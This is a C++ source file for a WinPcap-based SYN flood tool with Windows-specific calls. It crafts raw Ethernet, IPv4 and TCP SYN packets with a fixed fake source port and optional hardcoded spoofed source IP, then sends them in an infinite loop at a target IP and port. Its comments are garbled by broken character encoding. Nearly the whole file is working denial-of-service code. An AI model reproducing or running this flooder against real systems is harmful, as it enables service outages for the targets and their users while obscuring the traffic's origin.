#include "SynFlood.h"

//#define USING_FAKE_SADDR // IPv4�ײ��е�ԴIP��ַʹ�ü�IP������ʹ�ñ�������ʵIP��ַ

#ifdef USING_FAKE_SADDR
	const u_int g_fake_ip = 0x12345678;
#endif // USING_FAKE_SADDR

const u_short g_fake_port = 0xAABB; // Դ�˿ں�ʼ��ʹ�üٵ�

/////////////////////////////////////////////// public ///////////////////////////////////////////////

SynFlood::SynFlood() {
	DWORD dw;
#ifndef USING_FAKE_SADDR
	getSelfIpAndMask(&m_self_ip, (u_int*)&dw);
#endif // USING_FAKE_SADDR
	GetSelfMac(m_self_mac);
	GetNetAddrOfDefaultGateway(&dw, m_gate_mac);
}

SynFlood::~SynFlood() {

}

void SynFlood::attack(u_int ip, u_short port, u_int t_interval_ms) {
	u_char packet[sizeof(tcp_packet)];
	make_syn_packet(packet, ip, port);
	
	// begin attacking
	printf("\nattacking...\n\n");
	for (int num = 1;;num++) {
		pcap_sendpacket(m_adhandle, packet, sizeof(packet));
		printf("packets sent: 0x%.8X", num);
		for (int i = 0;i < strlen("packets sent: 0x") + 8;i++) { printf("\b"); }
		Sleep(t_interval_ms);
	}
}

/////////////////////////////////////////////// private ///////////////////////////////////////////////

u_short SynFlood::cksum(u_short *p, int len) {
	int cksum = 0;
	u_short answer = 0;

	// ��16bitsΪ��λ�ۼ�
	while (len > 1) {
		u_short t = *p;
		cksum += *p++;
		len -= 2;
	}
	// ������ݵ��ֽ���Ϊ����, �����һ���ֽ���Ϊ16bits�ĸ�8bits, ��8bits��0, �����ۼ�
	if (len == 1) {
		answer = *(u_short *)p;
		cksum += answer;
	}
	// cksum��32bits��int, ��У�����Ϊ16bits, �轫cksum�ĸ�16bits�ӵ���16bits��
	cksum = (cksum >> 16) + (cksum & 0xffff);
	// ��λ��
	return (~(u_short)cksum);
}

void SynFlood::make_syn_packet(u_char* packet, u_int dst_ip, u_short dst_port)
{
	tcp_packet syn_pkt = { 0 };

	// -----------------�����̫���ײ�-----------------
	memcpy(syn_pkt.eh.daddr, m_gate_mac, MAC_LEN);
	memcpy(syn_pkt.eh.saddr, m_self_mac, MAC_LEN);
	syn_pkt.eh.prototype = htons(ETHPROTOCAL_IPV4);

	// -----------------��� IPv4 �ײ�-----------------
	syn_pkt.ih.ver_ihl = 0x45;
	syn_pkt.ih.tlen = htons(sizeof(syn_pkt) - sizeof(ether_header));
	syn_pkt.ih.ttl = 128;
	syn_pkt.ih.proto = IPV4PROTOCOL_TCP;
#ifdef USING_FAKE_SADDR
	syn_pkt.ih.saddr = g_fake_ip;
#else
	syn_pkt.ih.saddr = m_self_ip;
#endif // USING_FAKE_SADDR
	syn_pkt.ih.daddr = dst_ip;
	syn_pkt.ih.cksum = cksum((u_short*)&syn_pkt.ih, sizeof(ip_header));

	// -----------------��� TCP �ײ�-----------------
	syn_pkt.th.sport = htons(g_fake_port);
	syn_pkt.th.dport = htons(dst_port);
	syn_pkt.th.seq = htonl(rand());
	syn_pkt.th.ack = 0;
	syn_pkt.th.lenres = (sizeof(tcp_header) / 4) << 4; // len = sizeof(tcp_header) / 4, res = 0
	syn_pkt.th.flag = SYN;
	syn_pkt.th.win = htons(WIN_SIZE);
	syn_pkt.th.cksum = 0;
	syn_pkt.th.urp = 0;
	// ѡ������ο� WireShark ��ʵ��ץ�����
	syn_pkt.th.options.mss.kind = 2;
	syn_pkt.th.options.mss.len = 4;
	syn_pkt.th.options.mss.value = htons(1460);
	syn_pkt.th.options.opt1.type = 1;
	syn_pkt.th.options.ws.kind = 3;
	syn_pkt.th.options.ws.len = 3;
	syn_pkt.th.options.ws.shift_count = 6;
	syn_pkt.th.options.opt2.type = 1;
	syn_pkt.th.options.opt3.type = 1;
	syn_pkt.th.options.sack_perm.kind = 4;
	syn_pkt.th.options.sack_perm.len = 2;

	// ʹ��α�ײ����� TCP У���
	psd_header ph;
	u_char buf[sizeof(psd_header) + sizeof(tcp_header)];

	ph.saddr = syn_pkt.ih.saddr;
	ph.daddr = syn_pkt.ih.daddr;
	ph.mbz = 0;
	ph.proto = IPV4PROTOCOL_TCP;
	ph.len = htons(sizeof(tcp_header));

	memcpy(buf, &ph, sizeof(ph));
	memcpy(buf + sizeof(psd_header), &syn_pkt.th, sizeof(syn_pkt.th));

	syn_pkt.th.cksum = cksum((u_short*)buf, sizeof(buf));

	memcpy(packet, &syn_pkt, sizeof(syn_pkt));
}
